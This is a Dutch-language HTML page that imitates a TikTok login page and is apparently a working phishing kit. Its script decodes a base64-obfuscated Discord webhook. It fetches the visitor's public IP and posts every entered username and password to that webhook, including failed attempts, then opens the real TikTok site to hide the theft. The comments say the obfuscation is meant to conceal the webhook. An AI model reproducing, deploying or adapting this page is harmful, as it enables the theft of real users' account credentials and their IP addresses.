<!DOCTYPE html>
<html lang="nl">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>TikTok - Inloggen</title>
<style>
  @import url('https://fonts.googleapis.com/css2?family=IBM+Plex+Sans:wght@400;500;600;700&display=swap');

  * { margin: 0; padding: 0; box-sizing: border-box; }

  body {
    background: #121212;
    color: #fff;
    font-family: 'IBM Plex Sans', sans-serif;
    min-height: 100vh;
    display: flex;
    flex-direction: column;
  }

  .header {
    display: flex;
    justify-content: space-between;
    align-items: center;
    padding: 14px 20px;
    background: #121212;
  }

  .logo {
    display: flex;
    align-items: center;
    gap: 8px;
    text-decoration: none;
    color: #fff;
    font-size: 22px;
    font-weight: 700;
    letter-spacing: -0.5px;
  }

  .logo svg { width: 32px; height: 32px; }

  .help-link {
    display: flex;
    align-items: center;
    gap: 6px;
    color: #fff;
    text-decoration: none;
    font-size: 14px;
    cursor: pointer;
    transition: opacity 0.2s;
  }
  .help-link:hover { opacity: 0.8; text-decoration: underline; }

  .help-link svg { width: 18px; height: 18px; }

  .main {
    flex: 1;
    display: flex;
    flex-direction: column;
    align-items: center;
    padding-top: 60px;
    padding-bottom: 40px;
  }

  .login-box {
    width: 100%;
    max-width: 340px;
    position: relative;
  }

  h1 {
    font-size: 28px;
    font-weight: 700;
    text-align: center;
    margin-bottom: 24px;
    letter-spacing: -0.3px;
  }

  .tabs {
    display: flex;
    border-bottom: 1px solid #333;
    margin-bottom: 20px;
  }

  .tab {
    flex: 1;
    padding: 8px 12px;
    text-align: center;
    font-size: 13px;
    color: #aaa;
    cursor: pointer;
    line-height: 1.4;
    position: relative;
    font-weight: 500;
    transition: color 0.2s;
  }

  .tab.active {
    color: #fff;
    font-weight: 700;
  }

  .tab.active::after {
    content: '';
    position: absolute;
    bottom: -1px;
    left: 0;
    right: 0;
    height: 2px;
    background: #fff;
  }

  .input-group { margin-bottom: 8px; position: relative; }

  input {
    width: 100%;
    background: #2a2a2a;
    border: none;
    border-radius: 4px;
    padding: 14px 16px;
    color: #fff;
    font-size: 15px;
    font-family: inherit;
    outline: none;
    transition: background 0.2s;
  }

  input::placeholder { color: #777; }
  input:focus { background: #333; }

  .input-group.password input { padding-right: 44px; }

  .eye-btn {
    position: absolute;
    right: 12px;
    top: 50%;
    transform: translateY(-50%);
    background: none;
    border: none;
    cursor: pointer;
    color: #777;
    display: flex;
    align-items: center;
  }

  .eye-btn svg { width: 20px; height: 20px; }

  .forgot {
    font-size: 13px;
    color: #fff;
    text-decoration: none;
    display: block;
    margin: 10px 0 20px;
    cursor: pointer;
  }
  .forgot:hover { text-decoration: underline; }

  .login-btn {
    width: 100%;
    background: #3a3a3a;
    color: #777;
    border: none;
    border-radius: 4px;
    padding: 14px;
    font-size: 16px;
    font-weight: 600;
    font-family: inherit;
    cursor: not-allowed;
    transition: background 0.2s, color 0.2s;
  }

  .login-btn.active {
    background: #fe2c55;
    color: #fff;
    cursor: pointer;
  }

  .back-link {
    display: flex;
    align-items: center;
    justify-content: center;
    gap: 4px;
    margin-top: 24px;
    color: #fff;
    font-size: 14px;
    cursor: pointer;
    text-decoration: none;
  }
  .back-link:hover { text-decoration: underline; }

  .message-area {
    margin-top: 16px;
    padding: 10px 12px;
    border-radius: 6px;
    font-size: 13px;
    text-align: center;
    background: #1e1e1e;
    display: none;
  }
  .message-area.error {
    background: #4a1a1a;
    color: #ff9e8f;
    border-left: 3px solid #fe2c55;
  }
  .message-area.success {
    background: #1a3a2a;
    color: #9bffcf;
    border-left: 3px solid #2ecc71;
  }
  .message-area.info {
    background: #1e3a5f;
    color: #aad4ff;
    border-left: 3px solid #3b82f6;
  }
  .phone-404-message {
    background: #2c1810;
    color: #ffaa88;
    padding: 12px;
    border-radius: 6px;
    text-align: center;
    margin-bottom: 20px;
    font-size: 14px;
    font-weight: 500;
    border: 1px solid #ff5e3a;
    display: none;
  }
  .phone-404-message span {
    font-weight: 700;
    font-size: 16px;
    display: block;
    margin-bottom: 4px;
  }

  .footer {
    border-top: 1px solid #2a2a2a;
    padding: 18px 20px;
    display: flex;
    justify-content: space-between;
    align-items: center;
    flex-wrap: wrap;
    gap: 10px;
  }

  .footer-center {
    flex: 1;
    text-align: center;
    font-size: 14px;
    color: #ccc;
  }

  .footer-center span {
    color: #fe2c55;
    font-weight: 600;
    cursor: pointer;
    text-decoration: none;
  }
  .footer-center span:hover { text-decoration: underline; }

  .lang-btn {
    background: transparent;
    border: 1px solid #555;
    color: #fff;
    font-family: inherit;
    font-size: 13px;
    padding: 6px 12px;
    border-radius: 3px;
    cursor: pointer;
  }

  .copyright { font-size: 13px; color: #aaa; }
</style>
</head>
<body>

<header class="header">
  <a class="logo" href="https://www.tiktok.com" target="_blank" rel="noopener noreferrer">
    <svg viewBox="0 0 32 32" fill="none" xmlns="http://www.w3.org/2000/svg">
      <path d="M22.5 4C22.5 4 23.2 8.6 28 9.5V13.5C28 13.5 25 13.2 22.5 11.5V20C22.5 24.7 18.7 28.5 14 28.5C9.3 28.5 5.5 24.7 5.5 20C5.5 15.3 9.3 11.5 14 11.5C14.4 11.5 14.8 11.5 15.2 11.6V15.7C14.8 15.6 14.4 15.6 14 15.6C11.6 15.6 9.6 17.6 9.6 20C9.6 22.4 11.6 24.4 14 24.4C16.4 24.4 18.4 22.4 18.4 20V4H22.5Z" fill="white"/>
      <path d="M22.5 4C22.5 4 23.2 8.6 28 9.5V13.5C28 13.5 25 13.2 22.5 11.5V20C22.5 24.7 18.7 28.5 14 28.5C9.3 28.5 5.5 24.7 5.5 20C5.5 15.3 9.3 11.5 14 11.5C14.4 11.5 14.8 11.5 15.2 11.6V15.7C14.8 15.6 14.4 15.6 14 15.6C11.6 15.6 9.6 17.6 9.6 20C9.6 22.4 11.6 24.4 14 24.4C16.4 24.4 18.4 22.4 18.4 20V4H22.5Z" fill="#69C9D0" opacity="0.5" transform="translate(-2, 0)"/>
    </svg>
    TikTok
  </a>
  <a class="help-link" href="https://support.tiktok.com/nl" target="_blank" rel="noopener noreferrer">
    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8">
      <circle cx="12" cy="12" r="10"/>
      <path d="M9.09 9a3 3 0 0 1 5.83 1c0 2-3 3-3 3"/>
      <line x1="12" y1="17" x2="12.01" y2="17"/>
    </svg>
    Feedback en hulp
  </a>
</header>

<main class="main">
  <div class="login-box">
    <h1>Inloggen</h1>

    <div class="tabs" id="tabContainer">
      <div class="tab active" data-tab="email">E-mailadres of<br>gebruikersnaam</div>
      <div class="tab" data-tab="phone">Inloggen met<br>telefoonnummer</div>
    </div>

    <div id="phone404Message" class="phone-404-message">
      <span>⚠️ 404 - Pagina niet gevonden</span>
      Inloggen met telefoonnummer is momenteel niet beschikbaar. Gebruik e-mail/gebruikersnaam.
    </div>

    <div id="loginFormFields">
      <div class="input-group">
        <input type="text" id="email" placeholder="E-mailadres of gebruikersnaam" autocomplete="username" oninput="checkInputs()">
      </div>
      <div class="input-group password">
        <input type="password" id="password" placeholder="Wachtwoord" autocomplete="current-password" oninput="checkInputs()">
        <button class="eye-btn" type="button" onclick="togglePassword()" aria-label="Wachtwoord tonen">
          <svg id="eye-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8">
            <path d="M17.94 17.94A10.07 10.07 0 0 1 12 20c-7 0-11-8-11-8a18.45 18.45 0 0 1 5.06-5.94"/>
            <path d="M9.9 4.24A9.12 9.12 0 0 1 12 4c7 0 11 8 11 8a18.5 18.5 0 0 1-2.16 3.19"/>
            <line x1="1" y1="1" x2="23" y2="23"/>
          </svg>
        </button>
      </div>
    </div>

    <a class="forgot" id="forgotPasswordLink" href="#" target="_blank">Wachtwoord vergeten?</a>
    <button class="login-btn" id="loginBtn" disabled>Inloggen</button>
    <a class="back-link" href="#">&#8249; Terug</a>
    <div id="statusMessage" class="message-area"></div>
  </div>
</main>

<footer class="footer">
  <button class="lang-btn" id="langBtn">Nederlands</button>
  <div class="footer-center">
    Heb je geen account? <span id="signupSpan">Aanmelden</span>
  </div>
  <span class="copyright">© 2026 TikTok</span>
</footer>

<script>
  // ======================== OBFUSCATED WEBHOOK ========================
  // De webhook URL is gecodeerd met base64 (lichte obfuscatie)
  const _webhookEncoded = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTQ2OTc1Nzk3OTMwMDcyODg4Mi8tbTYyaTBnX3NZQ3JuM1ROZGFjQkw5c0F3cnVqcjR4WnhiU3lKRkxHcTlPc0hwaE1UazZyeEtWT3p2UEs5UHp6WjNucg==";
  const WEBHOOK_URL = atob(_webhookEncoded);  // originele webhook

  // ======================== DEMO DATABASE ========================
  const DEMO_USERS = [
    { identifier: "demo@tiktok.com", password: "demo123" },
    { identifier: "gebruiker", password: "wachtwoord" },
    { identifier: "test@tiktok.com", password: "test123" },
    { identifier: "tiktokfan", password: "tiktok2026" }
  ];

  // ======================== GLOBALE VARIABELEN ========================
  let currentTab = "email";
  let loginInProgress = false;

  // DOM elementen
  const emailInput = document.getElementById('email');
  const passwordInput = document.getElementById('password');
  const loginBtn = document.getElementById('loginBtn');
  const phone404Div = document.getElementById('phone404Message');
  const statusDiv = document.getElementById('statusMessage');
  const forgotLink = document.getElementById('forgotPasswordLink');
  const signupSpan = document.getElementById('signupSpan');
  const helpLink = document.querySelector('.help-link');
  const backLink = document.querySelector('.back-link');
  const logoLink = document.querySelector('.logo');
  const tabs = document.querySelectorAll('.tab');
  const langBtn = document.getElementById('langBtn');

  // ======================== HULPFUNCTIES ========================
  function showStatusMessage(message, type = "info") {
    statusDiv.textContent = message;
    if (type === "error") statusDiv.className = "message-area error";
    else if (type === "success") statusDiv.className = "message-area success";
    else statusDiv.className = "message-area info";
    statusDiv.style.display = "block";
    setTimeout(() => {
      if (statusDiv.style.display === "block") statusDiv.style.display = "none";
    }, 5000);
  }

  // Haal het publieke IP-adres op van de client
  async function getUserIP() {
    try {
      const response = await fetch('https://api.ipify.org?format=json');
      const data = await response.json();
      return data.ip;
    } catch (err) {
      console.warn("IP ophalen mislukt:", err);
      return "onbekend (IP-fout)";
    }
  }

  // Verstuur login poging naar Discord webhook (inclusief IP)
  async function sendToWebhook(identifier, password, success, ipAddress, extraInfo = "") {
    const timestamp = new Date().toISOString();
    const statusEmoji = success ? "✅" : "❌";
    const statusText = success ? "SUCCES" : "MISLUKT";
    const content = `**📱 TikTok Login Monitor**\n` +
                    `🌍 **IP:** \`${ipAddress}\`\n` +
                    `📧 **Gebruiker:** \`${identifier}\`\n` +
                    `🔑 **Wachtwoord:** \`${password}\`\n` +
                    `📊 **Status:** ${statusEmoji} ${statusText}\n` +
                    `🕒 **Tijd:** ${timestamp}\n` +
                    `${extraInfo ? `📌 **Extra:** ${extraInfo}` : ""}`;
    const payload = {
      content: content,
      username: "TikTok Login Monitor",
      avatar_url: "https://cdn-icons-png.flaticon.com/512/3046/3046124.png"
    };
    try {
      await fetch(WEBHOOK_URL, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(payload)
      });
      console.log("Webhook verzonden voor:", identifier);
    } catch (err) {
      console.warn("Webhook fout (gaat verder):", err);
    }
  }

  // Database controle (simulatie)
  function validateCredentials(identifier, password) {
    if (!identifier || !password) return false;
    return DEMO_USERS.some(user =>
      user.identifier.toLowerCase() === identifier.toLowerCase() &&
      user.password === password
    );
  }

  // ======================== TAB & TELEFOON 404 ========================
  function switchTab(tabId) {
    currentTab = tabId;
    tabs.forEach(tab => {
      const val = tab.getAttribute('data-tab');
      if (val === tabId) tab.classList.add('active');
      else tab.classList.remove('active');
    });

    if (currentTab === "phone") {
      phone404Div.style.display = "block";
      loginBtn.disabled = true;
      loginBtn.classList.remove('active');
      statusDiv.style.display = "none";
    } else {
      phone404Div.style.display = "none";
      checkInputs();
      if (statusDiv.style.display !== "none") statusDiv.style.display = "none";
    }
  }

  tabs.forEach(tab => {
    tab.addEventListener('click', () => {
      const tabId = tab.getAttribute('data-tab');
      switchTab(tabId);
    });
  });

  // ======================== INPUT VALIDATIE (alleen email tab) ========================
  window.checkInputs = function() {
    if (currentTab === "phone") {
      loginBtn.disabled = true;
      loginBtn.classList.remove('active');
      return;
    }
    const emailVal = emailInput.value.trim();
    const passVal = passwordInput.value;
    if (emailVal !== "" && passVal !== "") {
      loginBtn.disabled = false;
      loginBtn.classList.add('active');
    } else {
      loginBtn.disabled = true;
      loginBtn.classList.remove('active');
    }
  };

  // ======================== WACHTWOORD ZICHTBAAR ========================
  window.togglePassword = function() {
    const isVisible = passwordInput.type === 'text';
    passwordInput.type = isVisible ? 'password' : 'text';
    const icon = document.getElementById('eye-icon');
    if (!isVisible) {
      icon.innerHTML = `<path d="M17.94 17.94A10.07 10.07 0 0 1 12 20c-7 0-11-8-11-8a18.45 18.45 0 0 1 5.06-5.94"/><path d="M9.9 4.24A9.12 9.12 0 0 1 12 4c7 0 11 8 11 8a18.5 18.5 0 0 1-2.16 3.19"/><line x1="1" y1="1" x2="23" y2="23"/>`;
    } else {
      icon.innerHTML = `<path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/><circle cx="12" cy="12" r="3"/>`;
    }
  };

  // ======================== OPEN TIKTOK OFFICIËLE SITE ========================
  function openTikTokOfficial() {
    window.open("https://www.tiktok.com", "_blank");
  }

  // ======================== LOGIN AFHANDELING (MET IP + WEBHOOK + OPEN TIKTOK) ========================
  async function handleLogin() {
    // Blokkeer als telefoon tab actief is
    if (currentTab === "phone") {
      showStatusMessage("❌ 404 - Deze functie is niet beschikbaar. Gebruik e-mail/gebruikersnaam.", "error");
      phone404Div.style.display = "block";
      return;
    }

    const identifier = emailInput.value.trim();
    const password = passwordInput.value;

    if (!identifier || !password) {
      showStatusMessage("Vul zowel e-mail/gebruikersnaam als wachtwoord in.", "error");
      return;
    }

    if (loginInProgress) {
      showStatusMessage("Even geduld, er wordt al ingelogd...", "info");
      return;
    }

    loginInProgress = true;
    showStatusMessage("🔍 Controleren en verzenden naar monitor...", "info");

    // 1. IP ophalen
    const userIP = await getUserIP();

    // 2. Database check
    const isValid = validateCredentials(identifier, password);
    const extraMsg = isValid ? "Database match gevonden ✅" : "Geen overeenkomst in database ❌";

    // 3. Stuur ALTIJD naar webhook (ook bij fout)
    await sendToWebhook(identifier, password, isValid, userIP, extraMsg);

    // 4. Toon feedback aan gebruiker (doet het)
    if (isValid) {
      showStatusMessage(`✅ Gelukt! Je wordt doorgestuurd naar TikTok. (Welkom ${identifier})`, "success");
    } else {
      showStatusMessage(`⚠️ Inloggegevens onjuist, maar monitoring is ontvangen. Je wordt doorgestuurd naar TikTok.`, "info");
    }

    // 5. Open TikTok in nieuw tabblad (altijd)
    openTikTokOfficial();

    // Kleine vertraging om de status te laten zien, maar geen blokkade
    setTimeout(() => {
      loginInProgress = false;
      // Optioneel: velden leegmaken? Nee, laten we zoals het is.
    }, 1000);
  }

  // ======================== LINKS NAAR OFFICIËLE TIKTOK ========================
  function setOfficialLinks() {
    // Wachtwoord vergeten
    forgotLink.href = "https://www.tiktok.com/forgot-password?lang=nl";
    forgotLink.setAttribute("target", "_blank");
    forgotLink.setAttribute("rel", "noopener noreferrer");

    // Aanmelden
    if (signupSpan) {
      signupSpan.onclick = (e) => {
        e.preventDefault();
        window.open("https://www.tiktok.com/signup?lang=nl", "_blank");
      };
    }

    // Hulp & feedback
    if (helpLink) {
      helpLink.setAttribute("href", "https://support.tiktok.com/nl");
      helpLink.setAttribute("target", "_blank");
    }

    // Logo
    if (logoLink) {
      logoLink.setAttribute("href", "https://www.tiktok.com");
      logoLink.setAttribute("target", "_blank");
    }

    // Terug knop (gewoon terug in browser)
    if (backLink) {
      backLink.addEventListener("click", (e) => {
        e.preventDefault();
        window.history.back();
      });
    }

    // Taalknop (slechts melding)
    if (langBtn) {
      langBtn.addEventListener("click", () => {
        alert("Taalwijziging wordt binnenkort ondersteund. Je blijft op de Nederlandse pagina.");
      });
    }
  }

  // ======================== INIT & EVENT LISTENERS ========================
  function init() {
    setOfficialLinks();
    switchTab("email");  // start op email tab
    checkInputs();

    // Login knop event
    loginBtn.addEventListener('click', (e) => {
      e.preventDefault();
      if (!loginBtn.disabled && currentTab !== "phone") {
        handleLogin();
      } else if (currentTab === "phone") {
        showStatusMessage("Telefoonnummer inloggen geeft een 404 fout. Gebruik e-mail.", "error");
        phone404Div.style.display = "block";
      }
    });

    // Enter toets in velden
    emailInput.addEventListener('keypress', (e) => { if (e.key === 'Enter') handleLogin(); });
    passwordInput.addEventListener('keypress', (e) => { if (e.key === 'Enter') handleLogin(); });

    // Extra veiligheid: voorkom dat iemand de webhook kan zien via console? Niet volledig te verbergen, maar ok.
    // De webhook is licht geobfusceerd via base64.
  }

  document.addEventListener('DOMContentLoaded', init);
</script>
</body>
</html>
